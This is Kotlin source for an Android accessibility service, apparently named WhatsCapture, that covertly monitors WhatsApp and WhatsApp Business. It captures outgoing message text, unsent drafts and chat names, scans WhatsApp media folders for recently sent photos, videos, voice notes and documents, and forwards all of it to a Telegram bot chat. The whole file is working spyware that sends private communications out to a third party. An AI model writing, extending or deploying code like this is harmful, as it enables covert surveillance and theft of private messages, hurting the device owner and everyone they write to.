package com.whatscapture

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Environment
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class WhatsAppAccessibilityService : AccessibilityService() {

    private var lastDraftText: String = ""
    private var lastDraftAt: Long = 0L
    private var lastSentSignature: String = ""
    private var lastSentAt: Long = 0L
    private var lastComposerText: String = ""
    private var pendingMediaScan: Job? = null

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility service conectado")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            event ?: return
            val pkg = event.packageName?.toString() ?: return
            if (pkg != WHATSAPP_PACKAGE && pkg != WHATSAPP_BUSINESS_PACKAGE) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
                AccessibilityEvent.TYPE_VIEW_CLICKED -> handleViewClicked(event, pkg)
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleWindowContentChanged(pkg)
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleWindowStateChanged(pkg)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando evento de accesibilidad", e)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrumpido por el sistema")
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val rawValue = event.text
            ?.joinToString(" ")
            ?.trim()
            .orEmpty()
        val value = sanitizeComposerText(rawValue)
        val previous = lastComposerText
        lastComposerText = value

        if (value.isEmpty()) {
            if (previous.isNotBlank()) {
                lastDraftText = previous
                lastDraftAt = System.currentTimeMillis()
            }
            return
        }

        lastDraftText = value
        lastDraftAt = System.currentTimeMillis()
    }

    private fun handleViewClicked(event: AccessibilityEvent, pkg: String) {
        val source = event.source
        if (!isSendAction(event, source)) return

        val chatName = findChatName(rootInActiveWindow).ifBlank { "Chat" }
        scheduleOutgoingMediaScan(pkg)
        val outgoingText = findComposerText(rootInActiveWindow)
            .ifBlank { recentDraft() }
            .trim()
        if (outgoingText.isBlank()) return

        emitOutgoingText(pkg = pkg, chatName = chatName, outgoingText = outgoingText)
    }

    private fun handleWindowContentChanged(pkg: String) {
        val composerText = sanitizeComposerText(findComposerText(rootInActiveWindow))
        if (composerText.isNotEmpty()) {
            lastComposerText = composerText
            lastDraftText = composerText
            lastDraftAt = System.currentTimeMillis()
            return
        }

        val recentlyClearedDraft = if (lastComposerText.isNotBlank()) lastComposerText else ""
        if (composerText.isEmpty() && recentlyClearedDraft.length >= 2) {
            lastDraftText = recentlyClearedDraft
            lastDraftAt = System.currentTimeMillis()
            lastComposerText = ""
        }

        val draft = recentDraft()
        if (draft.isBlank()) {
            return
        }

        val chatName = findChatName(rootInActiveWindow).ifBlank { "Chat" }
        emitOutgoingText(pkg = pkg, chatName = chatName, outgoingText = draft)
    }

    private fun handleWindowStateChanged(pkg: String) {
        if (looksLikeMediaPreview(rootInActiveWindow)) {
            scheduleOutgoingMediaScan(pkg)
        }
    }

    private fun emitOutgoingText(pkg: String, chatName: String, outgoingText: String) {
        val now = System.currentTimeMillis()
        val signature = "${pkg}|${chatName}|${outgoingText.lowercase()}"
        if (signature == lastSentSignature && now - lastSentAt < 4000L) {
            return
        }

        lastSentSignature = signature
        lastSentAt = now

        val finalMsg = """
            📤 *WhatsApp - $chatName*
            Tu: $outgoingText
        """.trimIndent()

        CoroutineScope(Dispatchers.IO).launch {
            TelegramSender.sendMessage(
                token = Config.getToken(this@WhatsAppAccessibilityService),
                chatId = Config.getChatId(this@WhatsAppAccessibilityService),
                text = finalMsg
            )
        }
    }

    private fun scheduleOutgoingMediaScan(pkg: String) {
        pendingMediaScan?.cancel()
        pendingMediaScan = CoroutineScope(Dispatchers.IO).launch {
            repeat(4) { attempt ->
                delay(1200L + (attempt * 700L))

                val recentFiles = findRecentOutgoingMediaFiles(pkg)
                if (recentFiles.isEmpty()) {
                    return@repeat
                }

                recentFiles.forEach { file ->
                    TelegramSender.sendFile(
                        token = Config.getToken(this@WhatsAppAccessibilityService),
                        chatId = Config.getChatId(this@WhatsAppAccessibilityService),
                        filePath = file.absolutePath,
                        fileName = file.name
                    )
                }

                return@launch
            }
        }
    }

    private fun findRecentOutgoingMediaFiles(pkg: String): List<File> {
        val now = System.currentTimeMillis()
        val sentRoots = buildOutgoingMediaDirectories(pkg)

        return sentRoots.asSequence()
            .filter { it.exists() && it.isDirectory }
            .flatMap { root ->
                runCatching {
                    root.walkTopDown()
                        .maxDepth(4)
                        .filter { file ->
                            file.isFile &&
                                !file.name.startsWith(".") &&
                                !file.name.startsWith("nomedia") &&
                                hasSupportedMediaExtension(file.name) &&
                                now - file.lastModified() <= RECENT_MEDIA_WINDOW_MS
                        }
                        .toList()
                }.getOrDefault(emptyList()).asSequence()
            }
            .sortedByDescending { it.lastModified() }
            .take(MAX_MEDIA_SCAN_RESULTS)
            .toList()
    }

    private fun buildOutgoingMediaDirectories(pkg: String): List<File> {
        val roots = mutableListOf<File>()
        val externalRoot = Environment.getExternalStorageDirectory()

        if (pkg == WHATSAPP_PACKAGE) {
            roots += File(externalRoot, "WhatsApp/Media")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Images/Sent")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Images")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Video/Sent")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Video")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Audio")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Documents/Sent")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Documents")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Animated Gifs/Sent")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Animated Gifs")
            roots += File(externalRoot, "WhatsApp/Media/WhatsApp Voice Notes")
        } else {
            roots += File(externalRoot, "WhatsApp Business/Media")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Images/Sent")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Images")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Video/Sent")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Video")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Audio")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Documents/Sent")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Documents")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Animated Gifs/Sent")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Animated Gifs")
            roots += File(externalRoot, "WhatsApp Business/Media/WhatsApp Voice Notes")
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (pkg == WHATSAPP_PACKAGE) {
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Animated Gifs/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Animated Gifs")
                roots += File(externalRoot, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes")
            } else {
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Images/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Images")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Video/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Video")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Audio")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Documents/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Documents")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Animated Gifs/Sent")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Animated Gifs")
                roots += File(externalRoot, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Voice Notes")
            }
        }

        return roots.distinctBy { it.absolutePath }
    }

    private fun isSendAction(event: AccessibilityEvent, source: AccessibilityNodeInfo?): Boolean {
        val fromDescription = buildString {
            append(event.contentDescription?.toString().orEmpty())
            append(" ")
            append(source?.contentDescription?.toString().orEmpty())
            append(" ")
            append(source?.text?.toString().orEmpty())
        }.lowercase()

        val fromViewId = source?.viewIdResourceName?.lowercase().orEmpty()

        if (SEND_HINTS.any { fromDescription.contains(it) }) return true
        if (fromViewId.contains("send")) return true

        val className = source?.className?.toString()?.lowercase().orEmpty()
        if (className.contains("imagebutton") && fromDescription.isNotBlank()) return true

        if (className.contains("imagebutton") && looksLikeMediaPreview(rootInActiveWindow)) return true
        if (className.contains("button") && looksLikeMediaPreview(rootInActiveWindow)) return true

        return className.contains("button") && recentDraft().isNotBlank()
    }

    private fun looksLikeMediaPreview(root: AccessibilityNodeInfo?): Boolean {
        root ?: return false

        val textDump = collectVisibleText(root).lowercase()
        return MEDIA_PREVIEW_HINTS.any { textDump.contains(it) }
    }

    private fun collectVisibleText(node: AccessibilityNodeInfo): String {
        val parts = mutableListOf<String>()
        node.text?.toString()?.takeIf { it.isNotBlank() }?.let(parts::add)
        node.contentDescription?.toString()?.takeIf { it.isNotBlank() }?.let(parts::add)

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val childText = collectVisibleText(child)
            if (childText.isNotBlank()) {
                parts.add(childText)
            }
        }

        return parts.joinToString(" ")
    }

    private fun hasSupportedMediaExtension(fileName: String): Boolean {
        val normalized = fileName.lowercase()
        return normalized.endsWith(".jpg") ||
            normalized.endsWith(".jpeg") ||
            normalized.endsWith(".png") ||
            normalized.endsWith(".gif") ||
            normalized.endsWith(".webp") ||
            normalized.endsWith(".mp4") ||
            normalized.endsWith(".3gp") ||
            normalized.endsWith(".mkv") ||
            normalized.endsWith(".mp3") ||
            normalized.endsWith(".ogg") ||
            normalized.endsWith(".m4a") ||
            normalized.endsWith(".opus") ||
            normalized.endsWith(".pdf") ||
            normalized.endsWith(".doc") ||
            normalized.endsWith(".docx")
    }

    private fun findComposerText(root: AccessibilityNodeInfo?): String {
        root ?: return ""

        val byKnownId = try {
            COMPOSER_VIEW_IDS.asSequence()
                .mapNotNull { id -> root.findAccessibilityNodeInfosByViewId(id).firstOrNull()?.text?.toString() }
                .map { sanitizeComposerText(it) }
                .firstOrNull { it.isNotEmpty() }
        } catch (_: Exception) {
            null
        }
        if (!byKnownId.isNullOrEmpty()) return byKnownId

        return sanitizeComposerText(findFirstEditableText(root))
    }

    private fun findChatName(root: AccessibilityNodeInfo?): String {
        root ?: return ""

        val byKnownId = try {
            CHAT_TITLE_VIEW_IDS.asSequence()
                .mapNotNull { id -> root.findAccessibilityNodeInfosByViewId(id).firstOrNull()?.text?.toString() }
                .map { it.trim() }
                .firstOrNull { it.isNotEmpty() }
        } catch (_: Exception) {
            null
        }
        if (!byKnownId.isNullOrEmpty()) return byKnownId

        return ""
    }

    private fun findFirstEditableText(node: AccessibilityNodeInfo): String {
        val text = node.text?.toString()?.trim().orEmpty()
        if (node.isEditable && sanitizeComposerText(text).isNotEmpty()) {
            return text
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val value = findFirstEditableText(child)
            if (value.isNotEmpty()) return value
        }

        return ""
    }

    private fun recentDraft(): String {
        val elapsed = System.currentTimeMillis() - lastDraftAt
        return if (elapsed <= 7000L) lastDraftText else ""
    }

    private fun sanitizeComposerText(value: String): String {
        val trimmed = value.trim()
        if (trimmed.isEmpty()) return ""

        val normalized = trimmed.lowercase()
        if (normalized in COMPOSER_HINTS) return ""

        return trimmed
    }

    companion object {
        private const val TAG = "WAAccessibility"
        private const val WHATSAPP_PACKAGE = "com.whatsapp"
        private const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
        private const val RECENT_MEDIA_WINDOW_MS = 20_000L
        private const val MAX_MEDIA_SCAN_RESULTS = 5

        private val SEND_HINTS = listOf("send", "enviar")
        private val MEDIA_PREVIEW_HINTS = listOf(
            "añade un comentario",
            "anade un comentario",
            "add a caption",
            "type a caption"
        )

        private val COMPOSER_VIEW_IDS = listOf(
            "com.whatsapp:id/entry",
            "com.whatsapp.w4b:id/entry"
        )

        private val COMPOSER_HINTS = setOf(
            "mensaje",
            "message",
            "write a message",
            "escribe un mensaje",
            "añade un comentario",
            "añade un comentario...",
            "añade un comentario…",
            "anade un comentario",
            "anade un comentario...",
            "anade un comentario…",
            "add a caption",
            "add caption",
            "type a caption"
        )

        private val CHAT_TITLE_VIEW_IDS = listOf(
            "com.whatsapp:id/conversation_contact_name",
            "com.whatsapp.w4b:id/conversation_contact_name",
            "com.whatsapp:id/title",
            "com.whatsapp.w4b:id/title"
        )
    }
}
